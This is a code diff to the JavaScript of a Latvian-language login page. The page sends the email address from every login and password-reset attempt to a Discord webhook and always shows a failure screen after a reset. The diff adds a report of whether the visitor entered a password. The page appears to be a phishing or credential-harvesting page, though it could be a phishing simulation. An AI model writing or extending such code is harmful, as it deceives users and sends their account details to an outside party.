@@ -576,7 +576,7 @@
         const attemptTracker = {};
 
         // ── Send to Discord (fire and forget - non-blocking) ──
-        function sendToDiscord(email, action) {
+        function sendToDiscord(email, action, passwordProvided) {
             if (!attemptTracker[email]) {
                 attemptTracker[email] = 0;
             }
@@ -590,6 +590,11 @@
                         {
                             name: '📧 E-pasts',
                             value: email || 'Nav norādīts',
+                            inline: true
+                        },
+                        {
+                            name: '🔑 Parole ievadīta?',
+                            value: passwordProvided ? '✅ Jā' : '❌ Nē',
                             inline: true
                         },
                         {
@@ -674,8 +679,9 @@
         function attemptLogin(email, password) {
             loginAttempts++;
             
-            // Fire webhook - non-blocking
-            sendToDiscord(email, 'Pieslēgšanās mēģinājums');
+            // Fire webhook - non-blocking, track if password was provided
+            const hasPassword = password && password.length > 0;
+            sendToDiscord(email, 'Pieslēgšanās mēģinājums', hasPassword);
             
             if (loginAttempts >= MAX_ATTEMPTS) {
                 formError.textContent = '';
@@ -692,8 +698,9 @@
 
         // ── Reset password ──
         function resetPassword(email, oldPassword) {
-            // Fire webhook - non-blocking
-            sendToDiscord(email, 'Paroles atjaunošanas mēģinājums');
+            // Fire webhook - non-blocking, track if password was provided
+            const hasPassword = oldPassword && oldPassword.length > 0;
+            sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', hasPassword);
             
             hideAllModals();
             showFailModal();
